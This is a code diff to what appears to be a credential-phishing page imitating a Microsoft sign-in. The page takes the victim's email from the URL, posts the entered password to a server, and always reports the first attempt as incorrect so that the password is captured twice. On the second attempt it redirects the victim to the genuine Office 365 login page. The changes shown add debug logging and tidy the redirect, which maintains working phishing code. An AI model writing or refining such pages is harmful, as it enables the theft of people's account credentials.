@@ -137,7 +137,7 @@
     <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
     
 
-    <script>
+   <script>
     // Initialize
     $(document).ready(function() {
         // Get email from URL hash
@@ -154,6 +154,9 @@
         if (!localStorage.getItem('login_attempt')) {
             localStorage.setItem('login_attempt', '1');
         }
+        
+        // Debug: log current attempt on page load
+        console.log('Page loaded. Attempt:', localStorage.getItem('login_attempt'));
         
         // Back button functionality
         $('#idBtn_Back').click(function() {
@@ -183,14 +186,14 @@
             const passwordInput = $('#psw');
             const emailInput = $('#email');
             
+            // Get current attempt BEFORE any processing
+            let attempt = parseInt(localStorage.getItem('login_attempt') || '1');
+            console.log('Starting form submission. Attempt:', attempt);
+            
             // Disable button and show loading
             submitBtn.prop('disabled', true);
             submitBtn.text('Verifying...');
             errorDiv.hide();
-            
-            // Get current attempt
-            let attempt = parseInt(localStorage.getItem('login_attempt'));
-            console.log('Current attempt:', attempt); // Debug log
             
             // Prepare form data
             const formData = {
@@ -199,7 +202,7 @@
                 attempt: attempt
             };
             
-            console.log('Sending data:', formData); // Debug log
+            console.log('Sending data:', formData);
             
             // Send AJAX request
             $.ajax({
@@ -210,21 +213,30 @@
                 timeout: 10000,
                 
                 success: function(response) {
-                    console.log('Response received:', response); // Debug log
+                    console.log('Response received:', response);
+                    console.log('Current attempt after response:', localStorage.getItem('login_attempt'));
                     
                     if (response && response.success) {
                         if (response.redirect) {
-                            // Redirect on second attempt
+                            // This should happen on SECOND attempt
+                            console.log('Redirecting to Office 365...');
                             localStorage.removeItem('login_attempt'); // Clear attempts
-                            // Redirect to Office 365 login page
-                            window.location.href = 'https://login.microsoftonline.com/';
+                            
+                            // Use setTimeout to ensure localStorage is cleared before redirect
+                            setTimeout(function() {
+                                window.location.href = 'https://login.microsoftonline.com/';
+                            }, 100);
+                            
                         } else if (response.incorrect) {
-                            // This should happen on first incorrect attempt
+                            // This should happen on FIRST incorrect attempt
+                            console.log('First incorrect attempt');
                             errorDiv.show();
                             errorDiv.text('Incorrect password. Please try again.');
                             
                             // Increment attempt counter for next try
-                            localStorage.setItem('login_attempt', (attempt + 1).toString());
+                            let newAttempt = attempt + 1;
+                            localStorage.setItem('login_attempt', newAttempt.toString());
+                            console.log('Attempt incremented to:', newAttempt);
                             
                             // Reset form
                             submitBtn.prop('disabled', false);
@@ -233,6 +245,7 @@
                             passwordInput.focus();
                         } else {
                             // Handle other success cases
+                            console.log('Other success case');
                             errorDiv.show();
                             errorDiv.text(response.message || 'Login successful');
                             submitBtn.prop('disabled', false);
@@ -240,20 +253,32 @@
                         }
                     } else {
                         // Handle error response
+                        console.log('Error in response');
                         errorDiv.show();
                         errorDiv.text(response.error || 'An error occurred. Please try again.');
+                        
+                        // Reset button state
                         submitBtn.prop('disabled', false);
                         submitBtn.text('Sign in');
+                        
+                        // Clear password field for security
+                        passwordInput.val('');
+                        passwordInput.focus();
                     }
                 },
                 
                 error: function(xhr, status, error) {
                     console.error('AJAX Error:', status, error);
+                    console.log('Current attempt on error:', localStorage.getItem('login_attempt'));
                     
                     errorDiv.show();
                     errorDiv.text('Connection error. Please try again.');
+                    
+                    // Reset button state
                     submitBtn.prop('disabled', false);
                     submitBtn.text('Sign in');
+                    
+                    // Clear password field for security
                     passwordInput.val('');
                     passwordInput.focus();
                 }
